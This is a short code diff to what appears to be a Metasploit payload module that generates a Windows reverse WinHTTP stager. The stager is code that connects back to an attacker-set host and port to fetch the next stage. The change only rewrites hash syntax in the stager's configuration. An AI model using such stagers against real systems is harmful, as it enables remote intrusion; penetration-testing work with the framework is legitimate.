@@ -27,21 +27,21 @@ module Payload::Windows::ReverseWinHttp
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_winhttp(
-        ssl:  false,
-        host: datastore['LHOST'],
-        port: datastore['LPORT'],
-        url:  generate_small_uri,
-        retry_count: datastore['StagerRetryCount'])
+      return generate_reverse_winhttp({
+        :ssl         => false,
+        :host        => datastore['LHOST'],
+        :port        => datastore['LPORT'],
+        :url         => generate_small_uri,
+        :retry_count => datastore['StagerRetryCount']})
     end
 
     conf = {
-      ssl:  false,
-      host: datastore['LHOST'],
-      port: datastore['LPORT'],
-      url:  generate_uri,
-      exitfunk: datastore['EXITFUNC'],
-      retry_count: datastore['StagerRetryCount']
+      :ssl         =>  false,
+      :host        => datastore['LHOST'],
+      :port        => datastore['LPORT'],
+      :url         =>  generate_uri,
+      :exitfunk    => datastore['EXITFUNC'],
+      :retry_count => datastore['StagerRetryCount']
     }
 
     generate_reverse_winhttp(conf)
@@ -50,6 +50,7 @@ module Payload::Windows::ReverseWinHttp
   def transport_config(opts={})
     transport_config_reverse_http(opts)
   end
+
   #
   # Generate and compile the stager
   #
